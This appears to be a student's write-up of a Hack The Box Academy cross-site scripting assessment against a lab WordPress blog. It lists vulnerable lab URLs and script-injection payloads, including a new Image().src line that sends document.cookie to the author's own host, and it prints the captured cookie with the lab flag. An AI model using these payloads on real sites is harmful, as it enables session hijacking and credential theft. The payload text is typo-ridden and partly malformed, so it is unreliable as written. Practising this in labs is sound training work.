We are performing a Web Application Penetration Testing task for a company that hired you, which just released their new Security Blog. In our Web Application Penetration Testing plan, we reached the part where you must test the web application against Cross-Site Scripting vulnerabilities (XSS).
Start the server below, make sure you are connected to the VPN, and access the /assessment directory on the server using the browser:

1. Identify a user-input field that is vulnerable to an XSS vulnerability.
2. Flag a working XSS payload that execute JS copde on the target.
3. Session hijacking tecniques.


We can detect the 2 XSS injections

1. [http://10.129.90.135/assessment/index.php/2021/06/11/welcome-to-security-blog/]

2. [http://10.129.90.135/assessment/index.php/author/xss/]

Firt we must ti identify the XSS payload.
we can try with paste the XSS:
```js
<script src="http://10.10.14.106/script.js"></script>
// And sniffing the traffic with the php
sudo php -S 0.0.0.0:80
// Then change the the code js:
new Image().src='http://10.10.14.106:8080/index.php?c='+document.cookie
// And try the XSS
"><script src="http://10.10.14.106:8080/index.php></script>
```
And we GET the Flag:
GET /index.php?c=wordpress_test_cookie=WP%20Cookie%20check;%20wp-settings-time-2=1743066256;%20flag=HTB{cr055_5173_5cr1p71n6_n1nj4}
https://academy.hackthebox.com/achievement/349590/103
